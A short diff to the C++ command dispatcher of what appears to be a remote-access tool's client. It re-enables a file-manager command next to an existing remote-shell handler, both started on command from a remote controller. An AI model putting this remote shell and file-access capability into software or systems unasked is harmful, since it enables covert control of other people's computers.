@@ -44,13 +44,14 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	case COMMAND_ACTIVED:
 		InterlockedExchange((LONG *)&m_bIsActived, true);
 		break;
-//  	case COMMAND_FILEMANAGER: // 文件管理
-//  		m_hThread[m_nThreadCount++] = (HANDLE)_beginthreadex(NULL, 0, Loop_FileManager, 
-//  			NULL, 0, NULL);
-//  		break;
+
 	case COMMAND_SHELLMANAGER: // 远程sehll
 		
 		m_hThread[m_nThreadCount++] = (HANDLE)_beginthreadex(NULL, 0, Loop_ShellManager, 
+			(void*)cmd->DialogPointer, 0, NULL);
+		break;
+	case COMMAND_FILEMANAGER: // 文件管理
+		m_hThread[m_nThreadCount++] = (HANDLE)_beginthreadex(NULL, 0, Loop_FileManager, 
 			(void*)cmd->DialogPointer, 0, NULL);
 		break;
 	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
